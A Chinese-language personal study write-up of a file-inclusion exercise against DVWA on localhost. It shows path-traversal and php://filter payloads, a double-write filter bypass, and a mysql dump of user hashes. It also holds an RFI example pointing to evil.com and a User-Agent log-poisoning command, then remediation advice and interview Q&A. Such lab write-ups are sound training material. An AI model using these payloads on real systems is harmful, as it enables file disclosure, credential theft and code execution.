# 文件包含（File Inclusion / LFI）

> 环境：DVWA（本地 Kali，http://127.0.0.1/DVWA/），安全等级 Low
> 时间：2026-11-05
> 性质：**本地靶场演练，个人练习，未对任何未授权目标发起测试**

---

## 一、这是什么

应用把用户输入**直接当成文件路径**交给 `include()` / `require()` 去加载。用户能控制路径，就能让服务器加载**它本来不该加载的文件**。

DVWA 的源码：

```php
$file = $_GET['page'];
include($file);
```

访问 `?page=../../../etc/passwd`，实际执行的就是：

```php
include('../../../etc/passwd');
```

**和 SQL 注入、命令执行是同一个根源：数据变成了代码/路径。**

| | SQL 注入 | 命令执行 | 文件包含 |
|---|---|---|---|
| 输入被当成 | SQL 语句 | shell 命令 | **文件路径 + 文件内容** |
| 逃逸手段 | `'` `#` `--` | `;` `&&` `\|` `&` | `../` 、伪协议 |
| 本质 | 数据变代码 | 数据变代码 | **数据变路径，路径的内容再变代码** |

---

## 二、成立条件

1. **有 include / require 功能**——常见于多语言站点：`?lang=cn`、`?page=about`、`?tpl=header`
2. **参数拼进 include**，且没做路径校验
3. **攻击者能控制这个参数**

> 文件包含比 SQL 注入更隐蔽：它往往出现在"页面切换""模块加载""多语言"这类正常功能里。

---

## 三、LFI / RFI / 文件上传 的区别

| 类型 | 英文 | 特征 | 能否直接 getshell |
|---|---|---|---|
| **本地文件包含** | LFI | 只能包含**本机**已有文件 | 不能直接，要靠日志投毒 / 文件上传 / `/proc/self/environ` 组合 |
| **远程文件包含** | RFI | 能包含 `http://` 上的文件 | **能**，但 PHP 默认 `allow_url_include = Off` |
| **文件上传** | Upload | 是另一类漏洞，上传文件到服务器 | 能，但要过校验 |

**一句话**：**LFI 是"读"，RFI 是"拉"，上传是"放"。三者经常组合使用。**

---

## 四、三档差异

| 难度 | 防护措施 | 绕过方法 |
|---|---|---|
| Low | 无过滤 | `?page=../../../etc/passwd` |
| Medium | `str_replace` 去掉 `http://`、`https://`、`../`、`..\` | 双写：`....//....//etc/passwd`（替换后剩下的拼回 `../`）|
| High | `fnmatch("file*", $file)` 白名单 | 用 `file://` 伪协议或路径里构造 `file1/../../` |

### Medium 的双写绕过原理

源码：

```php
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

输入 `....//....//....//etc/passwd`：

```
第一次替换 "../" → 把中间那组去掉，剩下的 ".." + "/" 拼回 "../"
```

**这就是"过滤不递归"的经典问题。**

## 五、实测记录

### 5.1 环境与入口

| 项目 | 内容 |
|---|---|
| 目标 | `http://127.0.0.1/DVWA/vulnerabilities/fi/` |
| 参数 | `page`（GET） |
| 正常值 | `include.php` / `file1.php` / `file2.php` / `file3.php` |
| 难度 | Low |

### 5.2 读系统用户表

```
?page=../../../etc/passwd
```

![读 passwd](<screenshots/21-文件包含-Low-读passwd.png>)

**结果**：页面顶部输出完整 `root:x:0:0:root:/root:/usr/bin/zsh` 用户表。

**拿到的情报**：

| 字段 | 值 | 意义 |
|---|---|---|
| root 的 shell | `/usr/bin/zsh` | 说明是 Kali / Debian 系 |
| 普通用户 | `kali:x:1000:1000` | 家目录 `/home/kali` |
| Web 运行身份 | `www-data` | Apache 以低权限运行 |

**为什么这里只用了 3 层 `../`？** `include()` 的相对路径是**相对于工作目录**的，不是相对于当前脚本。走 3 层就到了 `/`。**路径层数必须实测，不能靠公式算。**

### 5.3 读配置文件源码（关键一步）

**问题**：`config.inc.php` 是 PHP 文件，直接 `include` 会**执行**它，**不显示源码**，页面是一片空白。

**解法**：用 `php://filter` 伪协议，在加载前把内容转成 base64——base64 串不是 PHP 代码，不会被解析，原样输出。

```
?page=php://filter/convert.base64-encode/resource=/var/www/html/DVWA/config/config.inc.php
```

![base64 读配置](<screenshots/22-文件包含-Low-base64读配置.png>)

**结果**：页面顶部出现一大段 `PD9waHANCi...` 的 base64。

**注意**：`resource=` 后面用的是**绝对路径**。之前试过 `../../config/config.inc.php`，页面空白——`php://filter` 的 resource 最好给绝对路径，不依赖工作目录。

### 5.4 解码拿到数据库密码

```bash
echo 'PD9waHANCi...' | base64 -d | grep -E "db_server|db_user|db_password"
```

![解码得密码](<screenshots/23-文件包含-Low-解码得db密码.png>)

**结果**：

```
$_DVWA[ 'db_server' ]   = getenv('DB_SERVER') ?: '127.0.0.1';
$_DVWA[ 'db_user' ]     = getenv('DB_USER') ?: 'dvwa';
$_DVWA[ 'db_password' ] = getenv('DB_PASSWORD') ?: 'p@ssw0rd';
```

**拿到了数据库账号密码：`dvwa` / `p@ssw0rd`。**

### 5.5 验证凭据（危害坐实）

```bash
mysql -h 127.0.0.1 -u dvwa -p'p@ssw0rd' dvwa -e "select user, password from users;"
```

![数据库凭据](<screenshots/24-文件包含-Low-数据库凭据验证.png>)

**结果**：拿到全部 5 个用户的密码哈希。

| 用户 | 哈希 | 已知明文 |
|---|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

**`5f4dcc3b5aa765d61d8327deb882cf99` 是 `password` 的 MD5**——无盐 MD5，彩虹表一秒查出。

### 5.6 完整攻击链

```
?page=../../../etc/passwd                                   读用户表（情报）
        ↓
?page=php://filter/convert.base64-encode/resource=.../config.inc.php   读源码（绕过执行）
        ↓
base64 -d                                                   拿 db_password
        ↓
mysql -u dvwa -p'p@ssw0rd' -e "select user,password from users"        拿全部账号
```

**三步，从"能读文件"到"拿下数据库"。**

## 六、伪协议速查

| 伪协议 | 语法 | 用途 | 前提 |
|---|---|---|---|
| **`php://filter`** | `php://filter/convert.base64-encode/resource=路径` | **读 PHP 源码**（绕过执行） | 无（不受 allow_url_include 影响） |
| `php://input` | `php://input` | 把 POST body 当 PHP 执行 | `allow_url_include=On` |
| `data://` | `data://text/plain;base64,PD9waHA...` | 直接执行 base64 代码 | `allow_url_include=On` |
| `file://` | `file:///etc/passwd` | 读本地文件（绝对路径） | 默认可用 |
| `http://` | `http://evil.com/shell.txt` | **RFI**，包含远程文件 | `allow_url_include=On`（默认 Off） |
| `phar://` | `phar://上传的.phar/a.jpg` | 反序列化触发 | 需要能上传 phar |

**最常用的一条**：

```text
php://filter/convert.base64-encode/resource=目标文件绝对路径
```

**记住**：**`include` 会执行 PHP 文件，要读源码就必须先用 filter 转成 base64。**

## 七、LFI → RCE 的三条路

| 方法 | 做法 | 前提 | 难度 |
|---|---|---|---|
| **日志投毒** | 把 PHP 代码塞进 User-Agent，访问后被写进 `access.log`，再 include 日志 | 日志可读 | 中 |
| **文件上传 + 包含** | 先走上传漏洞传图片马，再 include 上传的文件 | 存在上传点 | 低 |
| **`/proc/self/environ`** | 把代码塞进 User-Agent，include 这个伪文件 | `proc` 可读 | 中 |
| **session 文件包含** | 把代码写进 session，include `/tmp/sess_xxx` | 会话文件路径可预测 | 中 |

**日志投毒的命令**：

```bash
curl -A "<?php system('id'); ?>" http://target/
# 然后
?page=/var/log/apache2/access.log
```

> 本次实验里**没有跑通日志投毒**（Apache 日志路径 / 权限未知），但这条路是成立的，面试会被问。

## 八、危害

| 层级 | 能做到什么 |
|---|---|
| 读系统文件 | `/etc/passwd`、`/etc/shadow`（如果有权限）、SSH 私钥 |
| **读配置文件** | **数据库密码、API Key、云凭据** ← 本次的真实危害 |
| 读源码 | 了解业务逻辑，找更多漏洞 |
| 日志投毒 | **LFI 升级为 RCE**，拿到 shell |
| 组合利用 | 结合文件上传 → getshell；结合 SSRF → 打内网 |

## 九、修复建议

### P0 白名单映射（根本手段）

不要用用户的输入**直接当路径**，用"查表"：

```php
$pages = array(
    'about'   => 'pages/about.php',
    'contact' => 'pages/contact.php',
);
$page = $_GET['page'];
if ( !array_key_exists( $page, $pages ) ) {
    die( 'Invalid page' );
}
include( $pages[ $page ] );
```

**为什么有效**：用户能接受的输入是**有限的、固定的几个值**，路径完全由服务端决定。

### P1 `basename()` 去掉目录

```php
$page = basename( $_GET['page'] );  // ../../../etc/passwd → passwd
include( 'pages/' . $page . '.php' );
```

**注意**：`basename()` 只解决"目录穿越"，**解决不了 `php://filter` 这类伪协议**，所以还得**禁止 `://`**。

```php
if ( strpos( $page, '://' ) !== false ) { die( 'Invalid' ); }
```

### P2 环境层加固

```ini
allow_url_include = Off          ; 禁 RFI（默认就是 Off）
open_basedir = /var/www/html     ; 限制 PHP 只能访问这个目录
disable_functions = ...
```

**`open_basedir` 是最狠的一招**：即使代码有洞，也读不到 `/etc/passwd`。

### ❌ 错误做法

```php
$file = str_replace( array('../', '..\\'), '', $file );  // 黑名单
```

**为什么错**：

- 过滤不递归 → `....//....//` 双写绕过
- `..%2f` URL 编码后可绕过（取决于是否先解码）
- 挡不住 `php://filter`（里面根本没有 `../`）

**和命令执行的黑名单是一模一样的教训：黑名单只能提高门槛，不能解决问题。**

## 十一、面试怎么问

**Q1：LFI 和文件上传有什么区别？**
> LFI 是"让服务器去 **加载** 一个已有文件"，读的是服务器上原本就存在的东西；文件上传是"我 **放** 一个文件上去"。两者经常组合——上传一个图片马，再用 LFI 去包含它，就能执行代码。

**Q2：为什么读 `config.inc.php` 比读 `/etc/passwd` 危害更大？**
> `/etc/passwd` 里只有用户名和家目录，密码在 `/etc/shadow` 且通常读不到；而 `config.inc.php` 里是**数据库账号密码明文**。拿到密码可以直接连数据库，读全部业务数据——这是**从"能读文件"变成"能读业务数据"**的分水岭。

**Q3：LFI 怎么变成 RCE？**
> include 会把文件内容当 PHP 执行，所以只要能往服务器上写一个含 PHP 代码的文件，再 include 它就行。最常见的三个写入点：①Apache access.log（把代码塞 User-Agent）②文件上传点（上传图片马）③`/proc/self/environ`（同样塞 User-Agent）④session 文件。

**Q4：怎么防 LFI？黑名单过滤 `../` 行不行？**
> 不行。黑名单过滤 `../` 会被 `....//` 双写绕过，也挡不住 `php://filter`（里面根本没有 `../`）。正确做法是**白名单映射表**——用户只能选预设的页面，路径完全由服务端决定。再加 `basename()`、禁止 `://`、`open_basedir` 收敛权限。

**Q5：`php://filter` 是干什么的，为什么能读源码？**
> 它是个 PHP 伪协议，能在 include 之前对文件内容做"流过滤"。`convert.base64-encode` 会把内容转成 base64，base64 不是合法 PHP 代码，所以不会被解析，原样输出，拿回来解码就是源码。

**Q6：为什么相对路径 `../../` 的层数不一样？**
> include 的相对路径是相对于**当前工作目录（CWD）**，不是相对于当前脚本文件。CWD 取决于 PHP-FPM / Apache 的启动配置。所以用 `php://filter` 时给**绝对路径**最稳。

---

## 十二、一句话

> **文件包含是"我能让服务器加载任意文件"。比起读 `/etc/passwd`，真正致命的是读配置文件——数据库密码就在里面。**
> 修复不是过滤 `../`，是**白名单映射 + open_basedir**。
